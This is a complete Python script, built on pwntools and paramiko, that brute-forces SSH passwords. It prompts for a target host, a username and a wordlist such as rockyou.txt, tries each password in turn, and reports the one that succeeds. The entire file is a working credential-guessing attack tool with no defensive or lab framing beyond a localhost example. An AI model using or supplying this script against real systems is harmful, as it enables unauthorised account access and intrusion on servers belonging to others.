from pwn import *
import paramiko

def brute_force_ssh():
    host = input("Enter target host (e.g., 127.0.0.1): ")
    username = input("Enter SSH username: ")
    wordlist_path = input("Enter path to wordlist (e.g., /path/to/rockyou.txt): ")
    
    attempts = 0

    try:
        with open(wordlist_path, "r") as f:
            for password in f:
                password = password.strip()
                try:
                    print(f"[{attempts}] Trying: {password}")
                    session = ssh(host=host, user=username, password=password, timeout=1)
                    if session.connected():
                        print(f"[✓] Password found: {password}")
                        session.close()
                        return
                except paramiko.ssh_exception.AuthenticationException:
                    print("[X] Invalid password.")
                    attempts += 1
                except Exception as e:
                    print(f"[!] Error: {e}")
                    continue
    except FileNotFoundError:
        print(f"[!] Wordlist file not found: {wordlist_path}")


brute_force_ssh()
